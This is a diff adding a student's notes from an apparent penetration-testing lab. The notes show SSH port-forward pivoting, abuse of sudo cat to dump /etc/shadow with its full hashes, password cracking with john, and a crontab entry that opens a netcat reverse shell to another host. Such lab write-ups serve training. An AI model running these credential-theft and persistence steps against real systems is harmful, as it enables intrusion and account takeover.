@@ -538,3 +538,101 @@ msf6 exploit(multi/handler) > exploit
 
 opens terminal session on the target windows host
 Flag is in Users/Public/Documents
+
+================================================================
+================================================================
+CFTd9
+
+Scheme of Maneuver:
+>Jump Box
+->Pivot:192.168.28.105
+--->T1: 192.168.28.27
+--->T2: 192.168.28.12
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: unknown
+IP: 192.168.28.27
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+T2
+Hostname: unknown
+IP: 192.168.28.12
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+student@lin-ops:~$ ssh student@10.50.43.220 -L 12500:192.168.28.105:2222
+student@lin-ops:~$ ssh comrade@192.168.28.105 -p 12500 -L 12501:192.168.28.27:22	-Pivot:ftp
+student@lin-ops:~$ ssh comrade@localhost -p 12501 -L 12502:192.168.28.12:22		-T1:lin2
+student@lin-ops:~$ ssh comrade@localhost -p 12502					-T2:lin1
+
+
+billybob
+sudo -l
+	(ALL) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff, /bin/cat
+sudo cat /etc/shadow
+root:$6$/3RL8PUH$VdeUuKr75jSALs9jmLTGKMzxkZvhsRzmPsiCYM9cg.AODP1YgA.JWajSkknNxI0ptS/pK8PIOXMaXcvd3IgRT.:18934:0:99999:7:::
+zeus:$6$V34Nv7Ib$.PZChAQgzH9FMTfoUN0X3Y2mUIT3/rXju7cmXa2mAVTAZscB48slP8A333kYxrtlPzMLN9yEd5wZnQJe4Wzbz/:18934:0:99999:7:::
+daemon:*:18325:0:99999:7:::
+bin:*:18325:0:99999:7:::
+sys:*:18325:0:99999:7:::
+sync:*:18325:0:99999:7:::
+games:*:18325:0:99999:7:::
+man:*:18325:0:99999:7:::
+lp:*:18325:0:99999:7:::
+mail:*:18325:0:99999:7:::
+news:*:18325:0:99999:7:::
+uucp:*:18325:0:99999:7:::
+proxy:*:18325:0:99999:7:::
+www-data:*:18325:0:99999:7:::
+backup:*:18325:0:99999:7:::
+list:*:18325:0:99999:7:::
+irc:*:18325:0:99999:7:::
+gnats:*:18325:0:99999:7:::
+nobody:*:18325:0:99999:7:::
+systemd-network:*:18325:0:99999:7:::
+systemd-resolve:*:18325:0:99999:7:::
+syslog:*:18325:0:99999:7:::
+messagebus:*:18325:0:99999:7:::
+_apt:*:18325:0:99999:7:::
+lxd:*:18325:0:99999:7:::
+uuidd:*:18325:0:99999:7:::
+dnsmasq:*:18325:0:99999:7:::
+landscape:*:18325:0:99999:7:::
+sshd:*:18325:0:99999:7:::
+pollinate:*:18325:0:99999:7:::
+ubuntu:!:18934:0:99999:7:::
+comrade:$6$EabwO.sc$zT1xo.vDKK209IDOiZjDIXoc8YGU2ljT/LEE8i.pG0bO1xvHMTsZQKGkBAuDqZ4r7Xk4dNJzIVFe6VdzLt8PT0:18934:0:99999:7:::
+billybob:$6$je9YkJOP$Jdu6dFuwkqS3Qg5xT.2dq9elEU9b0.ybTaXwIYFnqn9g/k0h.n1PtUOROf28gVVxNzYJ4z8.uw7ve9BTD7t611:18934:0:99999:7:::
+bobby:$6$ryRQEt/S$lTxP9YSMV4NllvVwpHyw4I.sgl7a4htNeKgzHeGNyhXKLtLgTBF2rYd9y.fcO3cgA2cBL8RrwRIL1yrwSPbM7.:18934:0:99999:7:::
+jerry:$6$YMWB7T6W$7f2Nx71Tt4eNDBuBeo6H.kjs93nIRD1j924GWZ.s/Xp5FNgo3JzJowgOhQ.8LkHcYFNuY1l4m3EJ5Br0FQMiU0:18934:0:99999:7:::
+jimmy:$6$h5lL6ckI$cL.Oei4ZvvG2iyiaD2HK09MVFpa0NGUZkVF5FSewC42NlNt2//I/FrzA0o3LXGZRlGck004K1i08CWpnkLj2l1:18934:0:99999:7:::
+sarah:$6$CBpHvShR$1CIKzlI9glGDyBDzoisnOBBvWBYAjlmGeqOPLrncAxFh6Ylvda3o31amBxtiU/L3XgjoZVCFjhW1.cv40MHwm/:18934:0:99999:7:::
+wendy:$6$p596ZHHF$Tse1FrfiLQQaAxxqlZpbYe9c3n6qZbzQmiGcuCFv8IwcvqC0v8422.mw4mR.dBKMQTNbq5/sj/c9VIV3JncNB0:18934:0:99999:7:::
+
+
+student@lin-ops:~/Security$ john --wordlist=10milly.txt myHash.txt
+zeus:ghjcnbnenrf:18934:0:99999:7:::
+
+crontab -e
+* * * * * nc 192.168.28.135 33403 -e /bin/bash
+
+
